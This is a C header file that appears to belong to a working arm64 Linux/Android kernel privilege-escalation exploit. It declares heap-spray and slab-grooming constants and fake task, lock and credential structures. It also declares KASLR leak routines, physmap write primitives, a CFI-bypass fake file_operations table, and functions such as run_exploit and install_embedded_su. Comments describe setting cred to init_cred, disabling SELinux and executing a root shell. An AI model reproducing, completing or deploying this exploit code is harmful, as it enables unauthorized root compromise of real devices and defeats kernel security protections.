#ifndef COMMON_H
#define COMMON_H

#define _GNU_SOURCE
#define __ARM 1

#include "offset.h"

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define PAGE_SHIFT 12
#define PAGE_SIZE (1UL << PAGE_SHIFT)
#define KS_PAGE_SIZE PAGE_SIZE
#define KS_PAGE_MASK (PAGE_SIZE - 1)

#include "kernelsnitch/utils.h"

#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 24
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
/* §58: with an ORDER-2 (16K) spray the payload's offset inside the reclaimed
   slab is a single constant, measured as +0x180 (STATUS §38 magic hits were all
   16K-aligned after subtracting 0x180).  The old -0xe80 assumed an ORDER-3
   (32K) spray, which required a buddy merge AND made the delta bimodal
   (slab+0x180 vs slab-0x7e80).  The DMAP route is delta-agnostic, so this only
   affects the grooming route. */
#define SKB_DATA_DELTA (0x180LL)

#define MM_STRUCT_SZ 0x3c0   /* sizeof(mm_struct) - verified from kernel mm_cache_init */
#define MM_ORDER 3           /* mm_struct slab order - VERIFIED from /proc/slabinfo
                                on-device (9 Sep 2026): 34 objs/slab x 960 B = 32640 B
                                in 8 pages => order 3.  The old value 2 (with its
                                /sys/kernel/slab comment) is WRONG on this kernel -
                                /sys/kernel/slab is MAC-denied, slabinfo is not. */
#define MM_PARTIALS 5
#define CORE 0
#define KSNITCH_COLLISIONS 12

#define DIRECT_MAP_BASE P0_PAGE_OFFSET
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define KERNELSNITCH_IDENTITY_START DIRECT_MAP_BASE
#define KERNELSNITCH_IDENTITY_END (DIRECT_MAP_BASE + P0_DMAP_END_OFF)
/* actual RAM-backed part of the linear map (reject leaks outside it).
 * arm64: __va(memstart_addr) == PAGE_OFFSET. Device RAM is fragmented:
 * phys [2G,4G) ??[32G,38G) => direct map [PO, PO+2G) ??[PO+30G, PO+36G). */
#define RAM_MAP_BASE P0_PAGE_OFFSET
#define RAM_MAP_END  (P0_PAGE_OFFSET + P0_DMAP_END_OFF)

#define LOCK_OFF (g_lock_off)
#define W0_OFF   (g_w0_off)
#define FAKE_TASK_OFF (g_task_off)
/* Layout is selectable: the slab/grooming route needs the structures spread over
   ~0x3a00 bytes; the physmap route needs everything inside ONE 4 KB page so the
   template can be replicated at 4 KB periodicity. */
#define PM_LOCK_OFF 0x100
#define PM_W0_OFF   0x300
#define PM_TASK_OFF 0x700
#define PM_CRED_OFF 0x900
extern uint32_t g_lock_off;
extern uint32_t g_w0_off;
extern uint32_t g_task_off;
extern uint32_t g_cred_off;
extern int g_skb_delta;

#define ORDER3_SIZE (PAGE_SIZE << 2)
/* §124.103: mm_struct slab size (ORDER-3, 32 KiB) - DISTINCT from the SKB
   order-2 above.  MM_ORDER was fixed 2->3 by /proc/slabinfo (§124.98);
   ORDER3_SIZE stays order-2 for the SKB spray geometry. */
#define MM_SLAB_SIZE ((size_t)PAGE_SIZE << MM_ORDER)
#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
/* §58: keep the whole skb head allocation inside ORDER-2 (16K): send length +
   sizeof(struct skb_shared_info) (~0x140) <= 0x4000.  This makes the spray take
   an order-2 page straight off the order-2 free list - no buddy merge - and
   keeps the payload offset a single constant. */
#define SKB_RECLAIM_SIZE 0x3e00
#define SKB_RECLAIM_SENDS 256

_Static_assert(SKB_SEND_SIZE == 0x8000,
               "SKB_SEND_SIZE must remain 64 KiB");
_Static_assert(SKB_RECLAIM_SIZE == 0x3e00,
               "unexpected SKB_RECLAIM_SIZE");

#define FAKE_TASK_PRIO 120
#define FAKE_WAITER_PRIO 130
#ifndef FAKE_TASK_UCLAMP_REQ_OFF
#define FAKE_TASK_UCLAMP_REQ_OFF 0x350
#endif
#ifndef FAKE_TASK_UCLAMP_OFF
#define FAKE_TASK_UCLAMP_OFF 0x358
#endif
#define FAKE_UCLAMP_ACTIVE_BIT 16
#define FAKE_UCLAMP_MIN_ACTIVE (1U << FAKE_UCLAMP_ACTIVE_BIT)
#define FAKE_UCLAMP_MAX_ACTIVE \
  (1024U | (19U << 11) | (1U << FAKE_UCLAMP_ACTIVE_BIT))

extern uintptr_t g_phys_delta;
#define P0_KERNEL_PHYS_DELTA (g_phys_delta)
#define P0_DATA_ALIAS_CONST(image_addr) \
  (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + g_phys_delta))

#define CONSUMER_CORE (CORE + 1)
#define CONSUMER_MAX_CALLS 1
#define PSELECT_ROUTE_NFDS 320
#define PSELECT_CONSUMER_NICE 19
#define PSELECT_CONSUMER_BURST_CALLS 1
#define PSELECT_ENTER_DELAY_USEC 50000
#define PSELECT_TIMEOUT_SEC 10  /* consumer fires ~50ms in; 2s keeps the overlay long enough while speeding attempts */
#define ROUTE_WAIT_SECONDS 8

#define SLIDE_NFULNL_LOGGER \
  P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_IMAGE)
#define SLIDE_LOGGERS_0_1 \
  P0_DATA_ALIAS_CONST(SLIDE_LOGGERS_0_1_IMAGE)
#define SLIDE_RANDOM_BOOT_ID_DATA \
  P0_DATA_ALIAS_CONST(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE)
#define SLIDE_INIT_TASK P0_DATA_ALIAS_CONST(SLIDE_INIT_TASK_IMAGE)
/* §124.46: nsproxy slide source = the nsproxy POINTER stored at
   init_task+TASK_NSPROXY_OFF (physmap alias, delta-known, no KASLR needed). */
#define SLIDE_TASK_NSPROXY_PTR \
  P0_DATA_ALIAS_CONST(SLIDE_INIT_TASK_IMAGE + TASK_NSPROXY_OFF)
/* §124.94: tasksprev slide source = init_task.tasks.prev field address
   (physmap alias, delta-known).  Fixup-safe anchor (see target.h). */
#define SLIDE_TASK_PREV_PTR \
  P0_DATA_ALIAS_CONST(SLIDE_INIT_TASKPREV_IMAGE)
/* §124.46: banner pipeline check = first 16 bytes of linux_banner
   ("Linux version 5.10" ASCII - a known-constant read proving the pipe). */
#define SLIDE_LINUX_BANNER \
  P0_DATA_ALIAS_CONST(SLIDE_LINUX_BANNER_IMAGE)
#define SLIDE_ROOT_TASK_GROUP \
  P0_DATA_ALIAS_CONST(SLIDE_ROOT_TASK_GROUP_IMAGE)
/* §113 zerolock aliases (delta-only, no page, no spray) */
#define ZERO_LOCK_ALIAS P0_DATA_ALIAS_CONST(ZERO_LOCK_IMAGE)
#define ZERO_WORD6_ALIAS P0_DATA_ALIAS_CONST(ZERO_WORD6_IMAGE)

#define PAGE_PAYLOAD_FOPS 0
#define PAGE_PAYLOAD_SLIDE 1

struct local_sched_attr {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime;
  uint64_t sched_deadline;
  uint64_t sched_period;
};

struct mm_ctx {
  size_t mm_cnt;
  int *memfds;
};

extern uintptr_t page_base;
extern uintptr_t fake_lock;
extern uintptr_t fake_w0;
extern uintptr_t fake_task;
extern uintptr_t fake_cred;
/* v20 experiment switches.  g_no_restore: reuse the DMAP page WITHOUT
   rebuilding the structures per primitive (measures how fast the kernel's
   collateral degrades a page that cannot be repaired - the device case).
   g_stress: number of known-plaintext primitives to run in one boot. */
extern int g_no_restore;
extern int g_force_groom;
extern int g_physmap;
extern int g_zero_lock;
extern int g_forensic;      /* §122.19: keep the panic triggers disarmed and
                               delay the victim's sysrq-b (20 min window) */
extern int g_own_probe;
extern uintptr_t g_pmap_phys_wanted;
extern int g_drain_slabs;
extern int g_stress;
uintptr_t dmap_alias(void);
uintptr_t zerolock_slot(int i);
void payload_neutralize(void);
size_t payload_copy_out(unsigned char *dst, size_t cap);
int run_stress_stage(int count);
int run_persist_stage(int rounds);
void persist_set_probe_deltas(int on);
void persist_set_slide_rounds(int n);
void persist_neutralize_page(void);
void persist_set_skip_sigalrm(int on);
void persist_set_cycle_prio(int on);
void persist_set_cycle_ovl(int on);
extern uint64_t g_slide_waiter_prio;
void persist_set_seq(int on);
void persist_set_seq_cfi(int on);
void persist_set_seq_vcfimin(int on);
/* §124.124 short seq: HIT -> E3 task (perf, prefilled) -> 3 walks
   (selinux zero, real_cred=init_cred, cred=init_cred) -> execve. */
void persist_set_short_seq(int on);
extern int pr_short_seq;
void persist_set_slide_ns(int on);      /* see 124.46 */
extern int pr_slide_ns;                 /* slide anchor select (persist.c) */
extern int perf_slide_requested;          /* §124.103 perfslide token (persist.c) */
extern int perf_bisect_parent;              /* §124.111 bisect switch (persist.c) */
extern int perf_bisect_left;                /* §124.112 bisect switch 2 (persist.c) */
/* §124.17 Option 1: full seq (roots a victim) + the CFI stage runs INSIDE that
   rooted victim (init domain can open /dev/ashmem; the shell domain cannot). */
extern int g_victim_cfi;
void persist_set_seq_start(int step);
void persist_set_seq_end(int step);     /* see 124.42 */
void persist_set_sweep(int on);
uintptr_t persist_sweep_first_phys(void);
void persist_set_sweep_start(int n);   /* see 124.27 */
void persist_set_sweep_rev(int on);     /* see 124.38 */
void persist_set_sweep_end(int n);      /* see 124.38 */
void persist_set_sweep_skip(const char *list);  /* see 124.54 */
int physmap_retarget(uintptr_t phys);
int physmap_retarget_mode(uintptr_t phys, int payload_mode);
uint64_t payload_page_word(uint32_t off);
/* §109 safe probe oracle: is the self-referential value `want_val` present at
   offset `off` in one of our sprayed pages?  Returns 1 and the page index. */
int physmap_find_self(uintptr_t want_val, uint32_t off, size_t *out_page);
void *pmap_buf_addr(void);size_t pmap_buf_len(void);int direct_read_boot_id_raw(unsigned char raw[16]);
extern uint64_t fake_cred_security;
extern uint64_t fake_cred_user_ns;
void payload_patch64(size_t off, uint64_t value);
uint32_t payload_read32(size_t off);
extern uintptr_t pselect_custom_target;
extern uintptr_t pselect_custom_value;
extern int pselect_custom_shape;
extern int direct_root_cpu;

extern uint32_t f_wait;
extern uint32_t f_pi_target;
extern uint32_t f_pi_chain;
extern atomic_int waiter_ready;
extern atomic_int waiter_waiting;
extern atomic_int owner_started;
extern atomic_int owner_chain_done;
extern atomic_int route_done;
extern atomic_int waiter_tid;
extern atomic_int punch_consume_go;
extern atomic_int punch_consume_stop;
extern atomic_int consumer_calls;
extern atomic_int consumer_success;
extern atomic_int main_route_delay_usec;

extern uint64_t kaslr_base;
extern uint64_t kaslr_slide;

int run_exploit(int argc, char **argv);
int install_embedded_su(pid_t *daemon_pid);
int init_direct_root_cpu(void);
int restore_initial_affinity(void);
void read_first_line(const char *path, char *buf, size_t len);
void log_startup_context(void);
void log_slide_child_context(void);
void disable_rseq_for_thread(void);
long futex_op(
    uint32_t *uaddr, int op, uint32_t val,
    const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
long sched_setattr_tid(int tid, int nice_value);

uintptr_t p0_alias_image_offset(uintptr_t data_alias);
uintptr_t kaslr_image_addr(uintptr_t image_addr);
uintptr_t text_addr(uintptr_t image_addr);
uintptr_t canon_addr(uintptr_t image_addr);
uintptr_t pselect_write_value(void);
uintptr_t pselect_write_target(void);
int pselect_write_shape(void);
void set_pselect_write(uintptr_t target, uintptr_t value, int shape);
void put64(unsigned char *p, size_t off, uint64_t value);
void put32(unsigned char *p, size_t off, uint32_t value);

void close_reclaim_sockets(void);
void cleanup_page_prepare_state(void);
int prepare_skb_payload(uintptr_t base, int payload_mode);
uintptr_t prepare_good_kernel_page(int payload_mode);

void fdset_put_word(fd_set *set, int word, uint64_t value);
uint64_t fdset_get_word(const fd_set *set, int word);
void do_pselect_fake_lock_route(void);
/* §124.121 seqoverlay: SEQPACKET stack overlay graft. */
void seqoverlay_once(void);
int seqoverlay_enabled(void);
void seqoverlay_handler(int sig);
void reset_main_route_state(void);
void run_main_route_threads(void);

int slide_pselect_words_per_set(void);
int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value);
void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, int shift, uint64_t value, const char *name);
void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
void open_slide_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd);
void slide_pselect_stack_copy(void);
int hex_value(char c);
int slide_leak_kernel_base(void);
/* §124.103 perf SAMPLE_IP slide (sabrina recipe, ZF9 paranoid=-1).
   Fills kaslr_base/slide deterministically (~1 min, no walk, no reboot).
   Returns 1 on SANE leak, 0 otherwise. */
int perf_leak_slide(void);
extern int perf_slide_done;
/* §124.123 E3: perf REGS_INTR own-task leak (slide.c). */
int perf_leak_task(uintptr_t *out_task);int is_kernel_ptr(uintptr_t value);
int is_direct_ptr(uintptr_t value);
int direct_pselect_write_once(
    uintptr_t target, uintptr_t value, int shape, int idx);
int direct_pselect_write_followup_once(
    uintptr_t target, uintptr_t value, int shape, int idx,
    uintptr_t followup_target, int followup_idx);

#endif

int prop_test_main(void);
int prop_raw_set(const char *name, const char *value);
int prop_chunk(int seq, int total, const char *text);

/* §124.11 Path A (cfi.c): fake CFI-safe file_operations table kept in our
   payload page at this offset (page bytes 0..7 are the sweep magic), plus the
   precise kernel r/w built on top of the redirect. */
#define CFI_PM_FOPS_OFF 0x10
void cfi_fill_fake_fops(unsigned char *page, size_t off);
int cfi_stage(unsigned char *page, uintptr_t page_alias);
uintptr_t cfi_misc_fops_field(void);
